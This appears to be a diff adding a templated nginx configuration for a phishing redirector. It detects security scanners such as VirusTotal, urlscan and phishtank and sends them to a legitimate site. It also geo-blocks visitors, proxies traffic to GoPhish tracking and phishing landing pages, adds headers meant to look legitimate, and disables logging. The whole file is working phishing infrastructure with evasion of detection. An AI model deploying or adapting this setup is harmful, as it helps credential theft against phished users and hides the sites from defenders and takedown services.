@@ -1,0 +1,104 @@
+# Phishing Redirector Configuration
+# Advanced evasion and filtering
+
+# Security tool detection
+map $http_user_agent $is_security_scanner {
+    default 0;
+    ~*(bot|crawl|spider|scraper|monitor|virustotal|urlvoid|hybrid-analysis|joesandbox|scanurl|urlscan|phishtank) 1;
+}
+
+# Geo-filtering map
+map $geoip_country_code $allowed_country {
+    default 1;
+    {% for country in blocked_countries | default([]) %}
+    {{ country }} 0;
+    {% endfor %}
+}
+
+server {
+    listen 80;
+    listen [::]:80;
+    server_name {{ phishing_subdomain }}.{{ domain }};
+    
+    return 301 https://$host$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    listen [::]:443 ssl http2;
+    server_name {{ phishing_subdomain }}.{{ domain }};
+    
+    # SSL Configuration
+    ssl_certificate /etc/letsencrypt/live/{{ phishing_subdomain }}.{{ domain }}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{{ phishing_subdomain }}.{{ domain }}/privkey.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+    ssl_prefer_server_ciphers on;
+    
+    # Security headers to appear legitimate
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "SAMEORIGIN" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "no-referrer-when-downgrade" always;
+    
+    # Block security scanners
+    if ($is_security_scanner) {
+        return 302 https://www.{{ legitimate_redirect | default('microsoft.com') }};
+    }
+    
+    # Geo-blocking
+    if ($allowed_country = 0) {
+        return 403;
+    }
+    
+    # Rate limiting
+    limit_req_zone $binary_remote_addr zone=phishing:10m rate=10r/s;
+    limit_req zone=phishing burst=20 nodelay;
+    
+    # GoPhish tracking and landing pages
+    location ~ ^/{{ gophish_rid_param | default('rid') }}/(.+) {
+        proxy_pass http://{{ gophish_server_ip }}:{{ gophish_phish_port | default(8081) }};
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+    
+    # Phishing landing pages
+    location / {
+        proxy_pass http://{{ phishing_web_ip }}:80;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+    
+    # Block direct access to sensitive paths
+    location ~ /\.(git|env|htaccess|htpasswd) {
+        deny all;
+        return 404;
+    }
+    
+    {% if zero_logs | default(true) %}
+    # Zero-logs configuration
+    access_log off;
+    error_log /dev/null crit;
+    {% endif %}
+}
+
+# Catch-all server block
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    listen 443 ssl default_server;
+    listen [::]:443 ssl default_server;
+    
+    ssl_certificate /etc/nginx/conf.d/selfsigned.crt;
+    ssl_certificate_key /etc/nginx/conf.d/selfsigned.key;
+    
+    return 302 https://www.{{ legitimate_redirect | default('google.com') }};
+    
+    access_log off;
+    error_log /dev/null crit;
+}
